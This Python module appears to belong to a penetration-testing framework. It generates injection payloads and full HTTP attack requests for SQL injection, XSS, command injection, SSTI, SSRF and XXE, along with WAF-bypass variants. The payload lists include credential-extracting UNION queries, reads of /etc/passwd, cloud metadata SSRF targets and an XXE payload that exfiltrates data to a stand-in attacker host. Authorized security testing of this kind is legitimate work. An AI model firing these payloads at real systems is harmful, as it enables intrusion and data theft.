"""Injection Agent — maps injection points and generates payloads."""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import TYPE_CHECKING

from cybersentinel.agents.base import BaseAgent
from cybersentinel.models.finding import Finding, Severity

if TYPE_CHECKING:
    from cybersentinel.models.session import Session


logger = logging.getLogger(__name__)


@dataclass
class InjectionPoint:
    """Details about an injection point."""

    parameter_name: str
    request_method: str  # GET, POST, etc.
    endpoint: str
    payload_type: str  # sqli, xss, command, ssti, ssrf, xxe
    vulnerable: bool = False


@dataclass
class InjectionPayload:
    """A payload for a specific injection point."""

    injection_point: InjectionPoint
    request: str  # Full HTTP request to send (NOT EXECUTED)
    expected_response: str  # What would indicate vulnerability
    waf_bypass_variants: list[str] = None  # WAF bypass alternatives


class InjectionAgent(BaseAgent):
    """Maps injection points and generates payloads."""

    name = "injection"
    description = "Maps injection points and generates payloads"

    def __init__(self, session: Session):
        super().__init__(session)
        self.payload_templates = self._initialize_payload_templates()

    def analyze(self, target: str, context: dict) -> list[Finding]:
        """Analyze findings to generate injection payloads.

        Args:
            target: Target identifier
            context: Dict with 'findings' key and 'requests' (from traffic analysis)

        Returns:
            Findings with injection payload details
        """
        if not self.validate(target, "Injection payload generation"):
            return []

        findings = context.get("findings", [])
        requests = context.get("requests", [])

        if not findings:
            return []

        new_findings = []

        for finding in findings:
            # Extract injection points from the finding
            injection_points = self._extract_injection_points(finding, requests)

            for inj_point in injection_points:
                payloads = self._generate_payloads(inj_point)

                payload_finding = Finding(
                    title=f"Injection Payloads: {inj_point.parameter_name} ({inj_point.payload_type})",
                    severity=finding.severity,
                    description=self._format_payload_description(inj_point, payloads),
                    affected_component=inj_point.endpoint,
                    agent_source=self.name,
                    confidence="high",
                    evidence=self._format_payload_evidence(inj_point, payloads),
                )

                new_findings.append(payload_finding)
                self.log(f"Generated payloads for: {inj_point.parameter_name}")

        return new_findings

    def _extract_injection_points(self, finding: Finding, requests: list) -> list[InjectionPoint]:
        """Extract injection points from a finding and request data."""
        injection_points = []

        # Identify injection type from finding
        payload_type = self._identify_payload_type(finding)

        # Extract from evidence if it contains parameter info
        if "parameter" in finding.evidence.lower():
            # Parse evidence for parameter names
            evidence_lines = finding.evidence.split("\n")
            for line in evidence_lines:
                if "parameter" in line.lower():
                    # Simple extraction: look for quoted parameter names
                    if "'" in line or '"' in line:
                        parts = line.split('"')
                        if len(parts) >= 2:
                            param_name = parts[1]
                            inj_point = InjectionPoint(
                                parameter_name=param_name,
                                request_method="POST",
                                endpoint=finding.affected_component,
                                payload_type=payload_type,
                                vulnerable=True,
                            )
                            injection_points.append(inj_point)

        # If no parameters extracted, create a generic one
        if not injection_points:
            inj_point = InjectionPoint(
                parameter_name="user_input",
                request_method="POST",
                endpoint=finding.affected_component,
                payload_type=payload_type,
                vulnerable=True,
            )
            injection_points.append(inj_point)

        return injection_points

    def _identify_payload_type(self, finding: Finding) -> str:
        """Identify payload type from finding."""
        title_lower = finding.title.lower()
        description_lower = finding.description.lower()

        type_keywords = {
            "sqli": ["sql", "database", "query"],
            "xss": ["xss", "script", "javascript"],
            "command": ["command", "exec", "shell"],
            "ssti": ["template", "ssti", "jinja"],
            "ssrf": ["ssrf", "request", "fetch"],
            "xxe": ["xml", "entity", "xxe"],
        }

        for payload_type, keywords in type_keywords.items():
            for keyword in keywords:
                if keyword in title_lower or keyword in description_lower:
                    return payload_type

        return "sqli"  # Default

    def _initialize_payload_templates(self) -> dict:
        """Initialize payload templates."""
        return {
            "sqli": [
                "' OR '1'='1' -- -",
                "1' UNION SELECT NULL,version() -- -",
                "1' AND SLEEP(5) -- -",
                "' UNION ALL SELECT NULL,CONCAT(username,':',password) FROM users -- -",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
            ],
            "command": [
                "; id #",
                "| whoami",
                "& hostname &",
                "`cat /etc/passwd`",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "{%if true%}VULNERABLE{%endif%}",
                "[[${7*7}]]",
            ],
            "ssrf": [
                "http://127.0.0.1:8080/",
                "http://localhost/admin",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=XXE">]><foo>&xxe;</foo>',
            ],
        }

    def _generate_payloads(self, injection_point: InjectionPoint) -> list[InjectionPayload]:
        """Generate payloads for an injection point."""
        payloads = []

        templates = self.payload_templates.get(injection_point.payload_type, [])

        for template in templates:
            payload = InjectionPayload(
                injection_point=injection_point,
                request=self._build_request(injection_point, template),
                expected_response=self._get_expected_response(injection_point.payload_type),
                waf_bypass_variants=self._generate_waf_bypasses(template),
            )
            payloads.append(payload)

        return payloads

    def _build_request(self, inj_point: InjectionPoint, payload: str) -> str:
        """Build full HTTP request for a payload."""
        if inj_point.request_method == "GET":
            return f"GET {inj_point.endpoint}?{inj_point.parameter_name}={payload} HTTP/1.1\nHost: target.com\n"
        else:
            return f"POST {inj_point.endpoint} HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\n{inj_point.parameter_name}={payload}"

    def _get_expected_response(self, payload_type: str) -> str:
        """Get expected response for different payload types."""
        expectations = {
            "sqli": "SQL error, unexpected result count, or boolean-based response change",
            "xss": "JavaScript alert box, script tag in response, or event handler execution",
            "command": "Command output in response (whoami, id, etc.)",
            "ssti": "Template expression evaluated (e.g., 49 instead of {{7*7}})",
            "ssrf": "Internal IP response, metadata endpoint data, or error page",
            "xxe": "/etc/passwd content or out-of-band callback confirmation",
        }
        return expectations.get(payload_type, "Unexpected behavior indicating vulnerability")

    def _generate_waf_bypasses(self, payload: str) -> list[str]:
        """Generate WAF bypass variants of a payload."""
        variants = []

        # Case variation
        if "select" in payload.lower():
            variants.append(payload.upper())
            variants.append(payload.replace("select", "sElEcT"))

        # Space variations
        if " " in payload:
            variants.append(payload.replace(" ", "/**/"))
            variants.append(payload.replace(" ", "\t"))

        # Comment variations
        if "--" in payload:
            variants.append(payload.replace("--", "#"))

        # Encoding variations (simplified)
        variants.append(f"UNHEX(HEX('{payload}'))")

        return variants[:3]  # Return top 3 variants

    def _format_payload_description(self, inj_point: InjectionPoint, payloads: list[InjectionPayload]) -> str:
        """Format payload description."""
        return (
            f"Generated {len(payloads)} injection payloads for parameter '{inj_point.parameter_name}' "
            f"({inj_point.payload_type.upper()}). "
            f"Endpoint: {inj_point.endpoint}. "
            f"Each payload includes WAF bypass variants. "
            f"These payloads are NOT EXECUTED and require explicit authorization."
        )

    def _format_payload_evidence(self, inj_point: InjectionPoint, payloads: list[InjectionPayload]) -> str:
        """Format payloads as evidence."""
        evidence = f"=== Injection Point Details ===\n"
        evidence += f"Parameter: {inj_point.parameter_name}\n"
        evidence += f"Method: {inj_point.request_method}\n"
        evidence += f"Endpoint: {inj_point.endpoint}\n"
        evidence += f"Type: {inj_point.payload_type.upper()}\n\n"

        for i, payload in enumerate(payloads, 1):
            evidence += f"--- Payload {i} ---\n"
            evidence += f"Request:\n{payload.request}\n\n"
            evidence += f"Expected Response: {payload.expected_response}\n\n"

            if payload.waf_bypass_variants:
                evidence += "WAF Bypass Variants:\n"
                for variant in payload.waf_bypass_variants:
                    evidence += f"  • {variant}\n"
                evidence += "\n"

        return evidence
